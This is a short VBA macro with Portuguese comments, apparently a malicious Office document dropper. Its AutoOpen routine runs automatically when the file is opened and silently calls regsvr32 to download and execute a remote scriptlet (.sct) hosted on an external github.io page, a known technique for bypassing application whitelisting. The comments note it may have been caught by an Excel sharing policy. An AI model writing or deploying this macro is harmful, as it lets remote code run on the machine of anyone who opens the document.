Sub AutoOpen() ' Aqui foi um erro, percebi na sexta que talvez foi por isso que foi pego pela diretriz de compartilhamento do excel.

Dim shell
Dim out
Set shell = VBA.CreateObject("WScript.Shell")
out = shell.Run("regsvr32 /u /n /s /i:https://igorfavin.github.io/website/user.sct scrobj.dll", 0, False) ' Chamando o registrador de dll ActiveXObject pra tentar executar o scriptlet externo.

End Sub

